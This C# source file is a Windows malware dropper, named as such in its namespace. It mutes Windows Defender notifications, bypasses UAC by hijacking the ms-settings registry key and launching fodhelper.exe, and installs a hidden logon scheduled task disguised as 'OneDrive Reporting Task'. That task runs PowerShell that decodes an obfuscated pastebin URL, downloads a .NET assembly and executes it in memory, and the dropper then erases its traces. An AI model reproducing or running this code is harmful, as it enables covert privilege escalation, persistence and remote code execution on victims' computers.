using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace dropper
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Process schproc = new Process()
            {
                StartInfo = new ProcessStartInfo()
                {
                    FileName = "schtasks.exe",
                    Arguments = "/query /tn \"OneDrive Reporting Task\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                }
            };
            schproc.Start();
            string error = schproc.StandardError.ReadToEnd();
            schproc.WaitForExit();
            if (error == string.Empty) Environment.Exit(1);

            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", "Enabled", 0);

            string xmlpath = Path.GetTempFileName();
            File.WriteAllText(xmlpath,
@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT1S</Delay>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-noprofile -executionpolicy bypass -windowstyle hidden -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData([System.Text.Encoding]::UTF8.GetString($wc.DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0xMcXhXN01C')))));$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('" + args[0] + @"', '" + args[1] + @"', '" + args[2] + @"')))</Arguments>
    </Exec>
  </Actions>
</Task>");

            Process.Start(new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = @"/c reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d ""schtasks /create /tn \""OneDrive Reporting Task\"" /xml " + xmlpath + @""" /t REG_SZ /f",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            Process.Start(new ProcessStartInfo()
            {
                FileName = "fodhelper.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            Thread.Sleep(1000);

            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks.exe",
                Arguments = "/run /i /tn \"OneDrive Reporting Task\"",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            File.Delete(xmlpath);
            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", true).DeleteValue("Enabled");
            Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings\shell\open\command");
        }
    }
}